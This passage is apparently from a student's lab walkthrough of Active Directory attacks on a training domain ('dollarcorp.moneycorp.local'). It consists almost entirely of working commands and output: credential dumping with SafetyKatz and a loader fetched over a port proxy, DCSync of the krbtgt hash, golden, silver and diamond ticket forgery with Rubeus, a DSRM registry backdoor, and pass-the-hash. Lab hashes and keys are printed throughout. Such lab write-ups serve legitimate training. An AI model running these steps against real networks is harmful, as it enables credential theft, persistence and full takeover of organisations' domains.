  EndTime                  :  2/13/2025 10:59:56 AM
  RenewTill                :  2/20/2025 12:59:56 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  jkSjq92PAMd4qdKtBuUOHVTjm9BNiHX/080C89WMzn8=
  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
```

![New spawned terminal process](./assets/screenshots/learning_objective_08_new_spawned_terminal_process.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`whoami /groups`:
```
ERROR: Unable to get group membership information.
```
❌

`klist`:
```
Current LogonId is 0:0x14ce21f

Cached Tickets: (1)🎟️

#0>     Client: svcadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/13/2025 1:49:43 (local)
        End Time:   2/13/2025 11:49:43 (local)
        Renew Time: 2/20/2025 1:49:43 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y`:
```
Does \\dcorp-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:dcorp-dc cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\svcadmin>
```
🚀

![dcorp-dc | svcadmin](https://custom-icon-badges.demolab.com/badge/dcorp--dc-svcadmin-64b5f6?logo=windows11&logoColor=white)

`whoami /groups`:
```
C:\Users\svcadmin>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                          Attributes
============================================ ================ ============================================ ===============================================================
Everyone                                     Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                       Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
dcorp\Domain Admins👥                        Group            S-1-5-21-719815819-3726368948-3917688648-512 Mandatory group, Enabled by default, Enabled group✅
Authentication authority asserted identity   Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
dcorp\Denied RODC Password Replication Group Alias            S-1-5-21-719815819-3726368948-3917688648-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level         Label            S-1-16-12288
```

`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`

![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)

`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-lsa /patch📌
Domain : dcorp / S-1-5-21-719815819-3726368948-3917688648

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

[SNIP]

RID  : 000001f6 (502)
User : krbtgt👤
LM   :
NTLM : 4e9815869d2090ccfca61c1fe0d23986🔑

[SNIP]

RID  : 000003e8 (1000)
User : DCORP-DC$👤
LM   :
NTLM : 68d6c096c7cfee52a45d6207489526bc🔑

[SNIP]
```

`exit`

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`whoami /groups`:
```
ERROR: Unable to get group membership information.
```
❌

`klist`:
```
Current LogonId is 0:0x15a746a

Cached Tickets: (4)

#0>     Client: svcadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/13/2025 1:49:43 (local)
        End Time:   2/13/2025 11:49:43 (local)
        Renew Time: 2/20/2025 1:49:43 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

[SNIP]
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt📌
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt👤
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502📌
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986🔑
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848🔑
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80
      
[SNIP]
```

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd`:
```
[SNIP]

[*] Action: Build TGT📌

[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully mounted
[*] Attempting to unmount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully mounted
[*] Attempting to unmount: \\us.dollarcorp.moneycorp.local\SYSVOL
[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully unmounted
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Retrieving group information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513))'
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC

[SNIP]

[*] Printing a command to recreate a ticket containing the information used within this ticket📌

C:\AD\Tools\Loader.exe Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:244 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD📌
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt`:
```
[SNIP]

[*] Action: Build TGT📌

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt📌
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator🎭@dollarcorp.moneycorp.local'🏛️

[*] AuthTime       : 2/13/2025 1:39:41 AM
[*] StartTime      : 2/13/2025 1:39:41 AM
[*] EndTime        : 2/13/2025 11:39:41 AM
[*] RenewTill      : 2/20/2025 1:39:41 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x848dc4

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/13/2025 1:39:41 (local)
        End Time:   2/13/2025 11:39:41 (local)
        Renew Time: 2/20/2025 1:39:41 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:dcorp-dc cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```
🚀
🚩

#### Domain Persistence | Silver Ticket (with Rubeus, SafetyKatz)

**Domain Persistence | Silver Ticket - HTTP Service**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:68d6c096c7cfee52a45d6207489526bc /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[SNIP]

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 68D6C096C7CFEE52A45D6207489526BC
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : http📌
[*] Target         : dcorp-dc📌.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'http/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 2/13/2025 5:01:30 AM
[*] StartTime      : 2/13/2025 5:01:30 AM
[*] EndTime        : 2/13/2025 3:01:30 PM
[*] RenewTill      : 2/20/2025 5:01:30 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x848e43

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: http📌/dcorp-dc📌.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/13/2025 5:01:30 (local)
        End Time:   2/13/2025 15:01:30 (local)
        Renew Time: 2/20/2025 5:01:30 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

`winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```
🚀

![dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
dcorp\administrator👤
```

`hostname`:
```
dcorp-dc🖥️
```
🚩

**Domain Persistence | Silver Ticket - WMI Service**

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:68d6c096c7cfee52a45d6207489526bc /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[SNIP]

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 68D6C096C7CFEE52A45D6207489526BC
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : host📌
[*] Target         : dcorp-dc📌.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'host/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 2/13/2025 5:10:56 AM
[*] StartTime      : 2/13/2025 5:10:56 AM
[*] EndTime        : 2/13/2025 3:10:56 PM
[*] RenewTill      : 2/20/2025 5:10:56 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:68d6c096c7cfee52a45d6207489526bc /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[SNIP]

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL🏛️ (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 68D6C096C7CFEE52A45D6207489526BC
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : rpcss📌
[*] Target         : dcorp-dc📌.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'rpcss/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 2/13/2025 5:11:23 AM
[*] StartTime      : 2/13/2025 5:11:23 AM
[*] EndTime        : 2/13/2025 3:11:23 PM
[*] RenewTill      : 2/20/2025 5:11:23 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
[SNIP]

Current LogonId is 0:0x848dc4

Cached Tickets: (2)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: rpcss📌/dcorp-dc📌.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/13/2025 5:07:08 (local)
        End Time:   2/13/2025 15:07:08 (local)
        Renew Time: 2/20/2025 5:07:08 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

#1>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: host📌/dcorp-dc📌.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/13/2025 5:05:47 (local)
        End Time:   2/13/2025 15:05:47 (local)
        Renew Time: 2/20/2025 5:05:47 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

[SNIP]
```

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc`:
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348📌
```
🚩

#### Domain Persistence | Diamond Ticket (with Rubeus)

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Diamond Ticket📌

[*] Showing process : True
[*] Username        : MZBPYDM3
[*] Domain          : LYOCO7MX
[*] Password        : B89I5HTT
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3252
[+] LUID            : 0x626d5a

[*] No target SPN specified, attempting to build 'cifs📌/dc.domain.com'
[*] Initializing Kerberos GSS-API📌 w/ fake delegation for target 'cifs/dcorp-dc.dollarcorp.moneycorp.local'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: 5Gs8379n58wpVLIc13YhnzmmPL9MOAbONZb0NbtgacY=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

[SNIP]

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x626d5a
[+] Ticket successfully imported!🎟️
```

![New spawned terminal process](./assets/screenshots/learning_objective_10_new_spawned_terminal_process.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`whoami /groups`:
```
ERROR: Unable to get group membership information.
```
❌

`klist`:
```
Current LogonId is 0:0x626d5a

Cached Tickets: (1)

#0>     Client: administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/13/2025 7:09:52 (local)
        End Time:   2/13/2025 17:09:43 (local)
        Renew Time: 2/20/2025 7:09:43 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:dcorp-dc cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```
🚀

![dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
dcorp\administrator👤
```

`hostname`:
```
dcorp-dc🖥️
```
🚩

#### Domain Persistence | DSRM (with PowerView, Rubeus, SafetyKatz)

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : AN4IZTNA
[*] Domain          : SPYX2VGR
[*] Password        : ACNAK5ME
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 7144
[+] LUID            : 0x3dd20f

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALsvcadmin
[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Target LUID : 4051471
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x3dd20f
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL🏛️
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  svcadmin🎭 (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  2/14/2025 1:45:16 AM
  EndTime                  :  2/14/2025 11:45:16 AM
  RenewTill                :  2/21/2025 1:45:16 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  R7HKKImUwV6eqiD8CMph42PZiTd0CCMn2VhoGIn6kDk=
  ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
```

![New spawned terminal process 1](./assets/screenshots/learning_objective_11_new_spawned_terminal_process_1.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`klist`:
```
Current LogonId is 0:0x3dd20f

Cached Tickets: (1)🎟️

#0>     Client: svcadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/14/2025 1:45:16 (local)
        End Time:   2/14/2025 11:45:16 (local)
        Renew Time: 2/21/2025 1:45:16 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y`:
```
Does \\dcorp-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

`winrs -r:dcorp-dc cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\svcadmin>
```
🚀

![dcorp-dc | svcadmin](https://custom-icon-badges.demolab.com/badge/dcorp--dc-svcadmin-64b5f6?logo=windows11&logoColor=white)

`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`

![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_11_hfs_safetykatz.png)

`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-sam📌
Domain : DCORP-DC🖥️
SysKey : bab78acd91795c983aef0534e0db38c7
Local SID : S-1-5-21-627273635-3076012327-2140009870

SAMKey : f3a9473cb084668dcf1d7e5f47562659

RID  : 000001f4 (500)
User : Administrator👤
  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd🔑

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

[SNIP]
```

`reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f`:
```
The operation completed successfully.
```

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"`:
```
[SNIP]

mimikatz(commandline) # sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe📌
user    : Administrator🎭
domain  : dcorp-dc🖥️
program : cmd.exe
impers. : no
NTLM    : a102ad5753f4c441e3af31c97fad86fd🔑
  |  PID  4920
  |  TID  5096
  |  LSA Process is now R/W
  |  LUID 0 ; 4946176 (00000000:004b7900)
  \_ msv1_0   - data copy @ 000001C96013CD30 : OK !
  \_ kerberos - data copy @ 000001C960646B08
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001C9607154E8 (32) -> null

[SNIP]
```

![New spawned terminal process 2](./assets/screenshots/learning_objective_11_new_spawned_terminal_process_2.png)

